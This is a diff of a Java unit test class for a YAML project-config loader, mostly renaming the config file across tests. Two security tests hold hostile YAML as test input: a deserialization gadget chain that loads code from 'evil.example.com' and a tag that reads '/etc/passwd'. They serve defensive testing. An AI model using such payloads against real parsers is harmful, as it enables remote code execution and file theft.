@@ -19,7 +19,7 @@ class ProjectConfigLoaderApplyOverridesTest {
 
     @Test
     void appliesCacheDirOverride(@TempDir Path tempDir) throws IOException {
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"),
+        Files.writeString(tempDir.resolve(".code-iq.yml"),
                 "cache_dir: my-custom-cache\n", StandardCharsets.UTF_8);
 
         var config = new CodeIqConfig();
@@ -34,7 +34,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                 max_depth: 20
                 max_radius: 15
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         var config = new CodeIqConfig();
         ProjectConfigLoader.loadIfPresent(tempDir, config);
@@ -50,7 +50,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                   parallelism: 8
                   incremental: true
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         var config = new CodeIqConfig();
         boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);
@@ -66,7 +66,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                 output:
                   max_nodes: 5000
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         var config = new CodeIqConfig();
         boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);
@@ -87,7 +87,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                 output:
                   max_nodes: 1000
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         var config = new CodeIqConfig();
         boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);
@@ -103,7 +103,7 @@ class ProjectConfigLoaderApplyOverridesTest {
         String yaml = """
                 max_depth: not_a_number
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         var config = new CodeIqConfig();
         ProjectConfigLoader.loadIfPresent(tempDir, config);
@@ -121,7 +121,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                   - python
                   - typescript
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
         assertNotNull(pc.getLanguages());
@@ -140,7 +140,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                   include:
                     - spring-rest-detector
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
         assertNotNull(pc.getDetectorCategories());
@@ -156,7 +156,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                   parallelism: 4
                   batch-size: 100
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
         assertEquals(4, pc.getPipelineParallelism());
@@ -178,7 +178,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                   - "*.generated.java"
                   - "vendor/**"
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
         assertNotNull(pc.getExclude());
@@ -191,7 +191,7 @@ class ProjectConfigLoaderApplyOverridesTest {
     void unsafeYamlTagDoesNotExecuteArbitraryCode(@TempDir Path tempDir) throws IOException {
         // Unsafe YAML tag that could trigger arbitrary class instantiation
         String yaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.example.com\"]]]]\n";
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         var config = new CodeIqConfig();
         // Should not throw and should not apply any overrides
@@ -210,7 +210,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                 cache_dir: legit-cache
                 exploit: !!java.io.File ["/etc/passwd"]
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         var config = new CodeIqConfig();
         // The YAML parser processes the whole document — even if the top-level parses,
@@ -232,7 +232,7 @@ class ProjectConfigLoaderApplyOverridesTest {
                   java: javaparser
                   python: antlr
                 """;
-        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
 
         ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
         assertNotNull(pc.getParsers());
